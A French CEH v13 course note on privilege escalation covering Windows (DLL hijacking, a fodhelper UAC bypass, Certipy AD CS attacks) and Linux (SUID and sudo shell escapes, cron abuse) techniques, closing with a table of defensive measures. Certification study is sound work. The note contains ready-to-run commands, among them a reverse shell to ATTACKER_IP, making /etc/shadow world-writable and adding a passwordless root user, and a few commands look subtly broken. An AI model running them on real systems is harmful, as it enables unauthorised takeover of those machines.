# ⬆️ 04 — Escalade de Privilèges

> **CEH v13 | Module 6** | [← Retour au sommaire](./README.md)

---

## 📖 Définition

L'**escalade de privilèges** est le processus d'obtention de droits supérieurs à ceux initialement accordés, permettant d'accéder à des ressources normalement réservées aux administrateurs/root.

---

## 🏗️ Types d'escalade de privilèges

```
┌─────────────────────────────────────────────────────────────────┐
│              TYPES D'ESCALADE DE PRIVILÈGES                     │
├──────────────────────┬──────────────────────────────────────────┤
│  VERTICALE           │ User → Admin → SYSTEM → Root             │
│  (la plus courante)  │ Obtenir des droits PLUS ÉLEVÉS           │
├──────────────────────┼──────────────────────────────────────────┤
│  HORIZONTALE         │ User A → User B                          │
│                      │ Accéder aux ressources d'UN AUTRE user   │
└──────────────────────┴──────────────────────────────────────────┘
```

---

## 🪟 Windows — Techniques d'escalade

### 1. DLL Hijacking

**Principe** : Windows charge les DLLs depuis des dossiers dans un ordre précis. Si un attaquant place une DLL malveillante dans un dossier prioritaire, elle sera chargée à la place de la légitime.

```
Ordre de recherche DLL Windows :
1. Dossier de l'application
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Dossier courant
6. Variable PATH

Attaque :
Identifier une DLL manquante (avec ProcMon) dans un dossier accessible
         ↓
Créer une DLL malveillante avec le même nom
         ↓
La placer dans le dossier prioritaire
         ↓
Quand l'application (avec droits élevés) se lance → notre DLL exécutée
```

**Outils** : Process Monitor (ProcMon), PowerSploit `Find-ProcessDLLHijack`

---

### 2. DLL Injection

**Principe** : Injecter une DLL malveillante dans un processus en cours d'exécution.

```
Processus légitime en cours d'exécution
         ↓
CreateRemoteThread() + LoadLibrary()
         ↓
DLL malveillante chargée dans l'espace mémoire du processus cible
         ↓
Exécution avec les privilèges du processus cible
```

---

### 3. Bypass UAC (User Account Control)

**UAC** : Mécanisme Windows qui demande confirmation avant d'exécuter des actions d'administration.

```
Technique : fodhelper.exe bypass
─────────────────────────────────
# Modifier la clé de registre
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
# Lancer fodhelper.exe → ouvre cmd.exe en mode élevé
fodhelper.exe
```

**Autres techniques UAC Bypass** :
- `eventvwr.exe` + clé registre `HKCU\Software\Classes\mscfile`
- `sdclt.exe` + clé registre
- Injection de DLL dans un processus auto-élevé

---

### 4. Named Pipe Impersonation

**Principe** : Un service exécuté en SYSTEM crée un Named Pipe. En se connectant à ce pipe, un processus peut **impersonner** son jeton de sécurité (SYSTEM).

```bash
# Meterpreter
meterpreter > getsystem
# Méthodes internes :
# Named Pipe Impersonation (In Memory/Admin)
# Named Pipe Impersonation (Dropper/Admin)
# Token Duplication (In Memory/Admin)
```

---

### 5. Exploitation de services mal configurés

```bash
# Vérifier les permissions sur les services
# Service avec chemin non entre guillemets → Unquoted Service Path
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Exemple vulnérable :
# C:\Program Files\Vulnerable App\service.exe
# Windows cherche : C:\Program.exe, C:\Program Files\Vulnerable.exe...

# Corriger : toujours mettre entre guillemets
# "C:\Program Files\Vulnerable App\service.exe"
```

**Vérifier les permissions du binaire d'un service** :
```bash
icacls "C:\Program Files\Vulnerable App\service.exe"
# Si Everyone:(F) → remplacement possible
```

---

### 6. Spectre & Meltdown

| Vulnérabilité | Type | Description |
|---------------|------|-------------|
| **Spectre** | CVE-2017-5753/5715 | Lecture de mémoire arbitraire via exécution spéculative |
| **Meltdown** | CVE-2017-5754 | Contournement de l'isolation user/kernel |

**Impact** :
- Lecture de la mémoire kernel depuis l'espace user
- Extraction de clés cryptographiques, mots de passe
- **Affecte** : Intel, AMD, ARM (2018)

**Outils de détection** :
- `SpecuCheck` (Windows)
- `spectre-meltdown-checker.sh` (Linux)

---

### 7. Abusing Boot/Logon Initialization Scripts

```
Registre Windows — Clés de persistence et escalade :
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
├── HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
├── HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
└── HKLM\SYSTEM\CurrentControlSet\Services

Si un service lié à une clé registre a des permissions "Full Control"
→ Remplacer le binaire par un payload
→ Exécution avec les droits SYSTEM au prochain redémarrage/login
```

---

### 8. AD Certificate Services (AD CS) Attacks

> Nouvelle section CEH v13

```
ESC1 : Enroll + spécifier un SAN arbitraire → usurpation d'identité
ESC2 : Tout usage (Any Purpose EKU)
ESC4 : Modifier le template pour ajouter un SAN
ESC8 : NTLM Relay vers les Web Enrollment Services AD CS

Outil : Certipy
─────────────────
# Trouver les templates vulnérables
certipy find -username user@domain.local -password Password1 -dc-ip 10.10.10.10

# Requérir un certificat ESC1
certipy req -username user@domain.local -password Password1 -ca CORP-CA -template VulnerableTemplate -upn administrator@domain.local
```

---

## 🐧 Linux — Techniques d'escalade

### 1. SUID/SGID Binaries

```bash
# Trouver les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# Exemples exploitables (GTFOBins)
# /usr/bin/find
find . -exec /bin/sh -p \; -quit

# /usr/bin/vim
vim -c ':!/bin/sh'

# /bin/cp (copier /etc/passwd modifié)
cp /etc/passwd /tmp/passwd.bak
echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
cp /etc/passwd /etc/passwd  # (via SUID)
```

**Référence** : https://gtfobins.github.io

---

### 2. Sudo Misconfigurations

```bash
# Vérifier les droits sudo
sudo -l

# Exemples de failles
# ALL=(ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# ALL=(ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.spawn("/bin/sh")'
```

---

### 3. Kernel Exploits (Linux)

```bash
# Identifier la version du kernel
uname -a
cat /etc/os-release

# Exploits célèbres
# Dirty COW (CVE-2016-5195) — Kernel < 4.8.3
# Dirty Pipe (CVE-2022-0847) — Kernel < 5.16.11
# Sudo Baron Samedit (CVE-2021-3156)
```

---

### 4. Cron Jobs mal configurés

```bash
# Voir les cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Si un script cron est éditable par un user normal
echo "chmod 777 /etc/shadow" >> /path/to/cron_script.sh

# Ou ajouter un reverse shell
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /path/to/cron_script.sh
```

---

## 🛠️ Outils d'énumération pour l'escalade

### WinPEAS / LinPEAS (PEASS-ng)
```bash
# Windows
.\winPEASx64.exe

# Linux
./linpeas.sh
```
Énumère automatiquement :
- Services vulnérables, DLL hijacking possible
- SUID/SGID, sudo, cron jobs
- Credentials dans fichiers de config
- Clés SSH, historique bash
- Vulnérabilités kernel connues

---

### Metasploit — Local Exploit Suggester
```bash
meterpreter > run post/multi/recon/local_exploit_suggester
# → Liste les exploits locaux applicables
```

---

### BeRoot
```bash
python beRoot.py   # Windows & Linux
# Vérifie : services, DLLs, applications, GPO, templates AD CS
```

---

## 🛡️ Défense contre l'escalade de privilèges

| Mesure | Description |
|--------|-------------|
| **Principe du moindre privilège** | Accorder uniquement les droits nécessaires |
| **UAC activé** | Ne jamais désactiver UAC sur Windows |
| **Patch régulier** | Mettre à jour OS et logiciels |
| **Auditer les services** | Vérifier les paths entre guillemets, permissions |
| **Auditer SUID/SUDO** | Revoir les binaires SUID et règles sudo |
| **AppLocker / GPO** | Restreindre les applications exécutables |
| **Credential Guard** | Protéger les jetons dans un enclave sécurisé |
| **Privileged Access Workstation** | Machines dédiées pour les admins |
| **Event IDs Windows** | Surveiller 4672, 4673, 4674 (privilege use) |

---

[← Exploitation](./03-vulnerability-exploitation.md) | [→ Maintaining Access](./05-maintaining-access.md)
